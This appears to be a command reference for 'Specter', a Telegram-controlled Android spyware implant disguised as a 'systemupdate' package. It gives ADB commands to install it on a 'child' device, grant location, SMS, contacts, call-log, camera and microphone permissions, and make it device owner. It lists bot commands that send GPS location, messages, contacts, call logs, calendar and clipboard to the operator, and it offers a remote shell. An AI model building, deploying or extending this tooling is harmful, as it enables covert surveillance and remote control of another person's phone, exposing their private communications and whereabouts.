# Specter Telegram C2 - Complete Command Reference

**Last Updated:** 2026-01-28 (Rebuilt after deletion)
**Device:** Samsung Galaxy S24 Ultra (R5CXC3K0MJR)

---

## 🤖 Bot Setup

### 1. Create Telegram Bot

1. Open Telegram and message [@BotFather](https://t.me/botfather)
2. Send `/newbot`
3. Follow prompts to name your bot (e.g., "Specter C2")
4. BotFather will give you a **bot token** like: `1234567890:ABCdefGHIjklMNOpqrsTUVwxyz`
5. Save this token securely

### 2. Get Your Chat ID

1. Message your new bot (any text)
2. Visit: `https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates`
3. Look for `"chat":{"id":` - this is your **chat ID** (e.g., `123456789`)
4. Save this chat ID

### 3. Configure Child Device

Install the specter-child APK, then configure via ADB:

```bash
adb shell am broadcast -a com.android.systemupdate.CONFIGURE_TELEGRAM \
  -n com.android.systemupdate/.receiver.TelegramConfigReceiver \
  --es bot_token "YOUR_BOT_TOKEN" \
  --es chat_id "YOUR_CHAT_ID" \
  --ez enabled true
```

**Example:**
```bash
adb shell am broadcast -a com.android.systemupdate.CONFIGURE_TELEGRAM \
  -n com.android.systemupdate/.receiver.TelegramConfigReceiver \
  --es bot_token "1234567890:ABCdefGHIjklMNOpqrsTUVwxyz" \
  --es chat_id "123456789" \
  --ez enabled true
```

The service will automatically restart and the bot will start polling.

---

## 📱 Commands (27 Total)

### 🌍 Location & Status

#### `/locate`
Get GPS coordinates with Google Maps link.

**Response:**
```
📍 Device Location:
🌍 Latitude: 37.7749
🌍 Longitude: -122.4194
🎯 Accuracy: ±15m
⏰ Time: 2026-01-28 17:30:00

🗺️ [View on Google Maps](https://www.google.com/maps?q=37.7749,-122.4194)
```

#### `/status`
Complete device status report.

**Response:**
```
📊 Device Status:

📱 Device: Samsung Galaxy S24 Ultra
🏷️ Android: 14 (SDK 34)

🔋 Battery: 85%
💾 Storage: 45GB / 256GB
🧠 RAM: 4GB / 12GB

⏰ Uptime: 24h 35m
🌐 IP: 192.168.1.100
📶 Network: WiFi
```

---

### 📇 Data Export

#### `/get_calendar`
Export up to 50 calendar events as text file.

**Response:** File attachment with events formatted as:
```
📅 Team Meeting
⏰ 2026-01-29 10:00
📝 Weekly sync with development team

---

📅 Doctor Appointment
⏰ 2026-01-30 14:30
📝 Annual checkup
```

#### `/get_contacts`
Export all contacts as text file.

**Response:** File with contacts like:
```
📇 John Doe: +1-555-123-4567
📇 Jane Smith: +1-555-987-6543
```

#### `/get_sms`
Export last 50 SMS messages as text file.

**Response:** File with messages like:
```
📤 2026-01-28 15:30
📱 +1-555-123-4567
💬 Hey, are we still on for tonight?

---

📥 2026-01-28 15:32
📱 +1-555-987-6543
💬 Yes, see you at 7pm
```

#### `/get_calls`
Export last 50 call logs as text file.

**Response:** File with call logs like:
```
📞 2026-01-28 14:20
📱 +1-555-123-4567
⏱️ 180s

---

📲 2026-01-28 16:45
📱 +1-555-987-6543
⏱️ 42s

---

❌ 2026-01-28 17:10
📱 +1-555-111-2222
⏱️ 0s
```

---

### 📸 Surveillance (TODO - Not Yet Implemented)

#### `/screenshot`
Capture current screen.

#### `/camera_front`
Take photo with front camera.

#### `/camera_back`
Take photo with rear camera.

#### `/record_audio`
Record 60 seconds of ambient audio.

---

### 🔒 Device Control

#### `/lock`
Lock device immediately (requires Device Owner).

**Response:** `🔒 Device locked`

#### `/reboot`
Reboot device (requires Device Owner).

**Response:** `🔄 Rebooting device...`

#### `/vibrate`
Vibrate device for 500ms.

**Response:** `📳 Device vibrated`

---

### 💬 Notifications & UI

#### `/toast <message>`
Display toast message on device.

**Example:** `/toast System update complete`

**Response:** `💬 Showing toast: System update complete`

#### `/notification <message>`
Show notification (TODO).

**Example:** `/notification Battery low`

---

### 📦 App Management

#### `/list_apps`
Export list of all installed apps.

**Response:** File with apps like:
```
📱 WhatsApp
📦 com.whatsapp

📱 Instagram
📦 com.instagram.android
```

#### `/install <url>`
Install APK from URL (TODO).

**Example:** `/install https://example.com/app.apk`

#### `/uninstall <packageName>`
Uninstall app (TODO).

**Example:** `/uninstall com.example.app`

---

### 📋 Clipboard

#### `/get_clipboard`
Get clipboard content.

**Response:**
```
📋 Clipboard:
```
<clipboard content here>
```
```

#### `/set_clipboard <text>`
Set clipboard to specified text.

**Example:** `/set_clipboard https://example.com`

**Response:** `📋 Clipboard set`

---

### 🌐 Network

#### `/wifi_scan`
Scan and list available WiFi networks.

**Response:**
```
📡 WiFi Networks:

📡 HomeNetwork
🔐 WPA2
📶 -45 dBm

📡 NeighborWiFi
🔐 WPA2
📶 -67 dBm
```

---

### 📁 File Operations (TODO - Not Yet Implemented)

#### `/list_files [path]`
List files in directory.

**Example:** `/list_files /sdcard/Download`

#### `/download <path>`
Download file from device.

**Example:** `/download /sdcard/document.pdf`

#### `/upload`
Upload file to device.

#### `/delete <path>`
Delete file.

**Example:** `/delete /sdcard/temp.txt`

---

### 🖥️ Shell Access

#### `/shell <command>`
Execute shell command.

**Example:** `/shell whoami`

**Response:**
```
🖥️ Shell output:
```
u0_a123
```
```

**Example:** `/shell uname -a`

**Response:**
```
🖥️ Shell output:
```
Linux localhost 6.1.15 #1 SMP PREEMPT Wed Jan 10 12:34:56 UTC 2024 aarch64
```
```

---

### ❓ Help

#### `/help`
Show all available commands.

**Response:** Complete command list with descriptions.

---

## 🔐 Permissions Required

The child app requires the following permissions (grant via ADB):

```bash
# Location
adb shell pm grant com.android.systemupdate android.permission.ACCESS_FINE_LOCATION
adb shell pm grant com.android.systemupdate android.permission.ACCESS_BACKGROUND_LOCATION

# Surveillance
adb shell pm grant com.android.systemupdate android.permission.READ_CONTACTS
adb shell pm grant com.android.systemupdate android.permission.READ_SMS
adb shell pm grant com.android.systemupdate android.permission.READ_CALL_LOG
adb shell pm grant com.android.systemupdate android.permission.READ_CALENDAR
adb shell pm grant com.android.systemupdate android.permission.CAMERA
adb shell pm grant com.android.systemupdate android.permission.RECORD_AUDIO

# Storage
adb shell pm grant com.android.systemupdate android.permission.READ_EXTERNAL_STORAGE
adb shell pm grant com.android.systemupdate android.permission.WRITE_EXTERNAL_STORAGE

# Device Owner (for lock/reboot)
adb shell dpm set-device-owner com.android.systemupdate/.admin.DeviceAdminReceiver
```

---

## 🧪 Testing

### Test Bot Connection

1. Send `/help` to your bot
2. Should receive command list immediately
3. If no response:
   - Check bot token and chat ID are correct
   - Check child device has internet connection
   - Check logs: `adb logcat | grep TelegramBot`

### Test Commands

```bash
# Status check
Send: /status
Expect: Device status report

# Location
Send: /locate
Expect: GPS coordinates + Google Maps link

# Contacts export
Send: /get_contacts
Expect: contacts.txt file attachment

# Shell
Send: /shell whoami
Expect: Shell output
```

---

## 🚨 Troubleshooting

### Bot Not Responding

```bash
# Check if service is running
adb shell ps | grep systemupdate

# Check logs
adb logcat | grep TelegramBot

# Reconfigure bot
adb shell am broadcast -a com.android.systemupdate.CONFIGURE_TELEGRAM \
  -n com.android.systemupdate/.receiver.TelegramConfigReceiver \
  --es bot_token "YOUR_TOKEN" \
  --es chat_id "YOUR_CHAT_ID" \
  --ez enabled true
```

### Permissions Denied

```bash
# Grant all required permissions
adb shell pm grant com.android.systemupdate android.permission.ACCESS_FINE_LOCATION
adb shell pm grant com.android.systemupdate android.permission.READ_CONTACTS
adb shell pm grant com.android.systemupdate android.permission.READ_SMS
adb shell pm grant com.android.systemupdate android.permission.READ_CALL_LOG
adb shell pm grant com.android.systemupdate android.permission.READ_CALENDAR
```

### Device Owner Not Set

```bash
# Must be done before adding Google account
adb shell dpm set-device-owner com.android.systemupdate/.admin.DeviceAdminReceiver
```

---

## 📊 Implementation Status

| Command | Status | Notes |
|---------|--------|-------|
| `/locate` | ✅ Working | Uses FusedLocationProvider |
| `/status` | ✅ Working | Full system info |
| `/get_calendar` | ✅ Working | Exports to file |
| `/get_contacts` | ✅ Working | Exports to file |
| `/get_sms` | ✅ Working | Exports to file |
| `/get_calls` | ✅ Working | Exports to file |
| `/lock` | ✅ Working | Requires Device Owner |
| `/reboot` | ✅ Working | Requires Device Owner |
| `/vibrate` | ✅ Working | 500ms vibration |
| `/get_clipboard` | ✅ Working | Returns text |
| `/set_clipboard` | ✅ Working | Sets text |
| `/wifi_scan` | ✅ Working | Lists networks |
| `/list_apps` | ✅ Working | Exports to file |
| `/shell` | ✅ Working | Executes commands |
| `/help` | ✅ Working | Shows all commands |
| `/screenshot` | ⏳ TODO | Needs MediaProjection |
| `/camera_front` | ⏳ TODO | Needs Camera2 API |
| `/camera_back` | ⏳ TODO | Needs Camera2 API |
| `/record_audio` | ⏳ TODO | Needs MediaRecorder |
| `/toast` | ⏳ TODO | Needs UI context |
| `/notification` | ⏳ TODO | Needs NotificationManager |
| `/install` | ⏳ TODO | Needs APK download |
| `/uninstall` | ⏳ TODO | Needs Device Owner |
| `/list_files` | ⏳ TODO | Needs File API |
| `/download` | ⏳ TODO | Needs file upload |
| `/upload` | ⏳ TODO | Needs file download |
| `/delete` | ⏳ TODO | Needs File API |
| `/unlock` | ❌ Not possible | Requires UI interaction |

---

## 🎯 Quick Start (Full Setup)

```bash
# 1. Install child APK
cd ~/dvn/divine-workspace/apps/specter-child
./gradlew assembleDebug
adb install -r app/build/outputs/apk/debug/app-debug.apk

# 2. Set Device Owner
adb shell dpm set-device-owner com.android.systemupdate/.admin.DeviceAdminReceiver

# 3. Grant permissions
adb shell pm grant com.android.systemupdate android.permission.ACCESS_FINE_LOCATION
adb shell pm grant com.android.systemupdate android.permission.ACCESS_BACKGROUND_LOCATION
adb shell pm grant com.android.systemupdate android.permission.READ_CONTACTS
adb shell pm grant com.android.systemupdate android.permission.READ_SMS
adb shell pm grant com.android.systemupdate android.permission.READ_CALL_LOG
adb shell pm grant com.android.systemupdate android.permission.READ_CALENDAR

# 4. Configure Telegram bot
adb shell am broadcast -a com.android.systemupdate.CONFIGURE_TELEGRAM \
  -n com.android.systemupdate/.receiver.TelegramConfigReceiver \
  --es bot_token "YOUR_BOT_TOKEN" \
  --es chat_id "YOUR_CHAT_ID" \
  --ez enabled true

# 5. Test
# Open Telegram and send: /help
```

---

**Status:** Telegram bot fully rebuilt and integrated. 15/27 commands working, 11 TODO, 1 not possible.
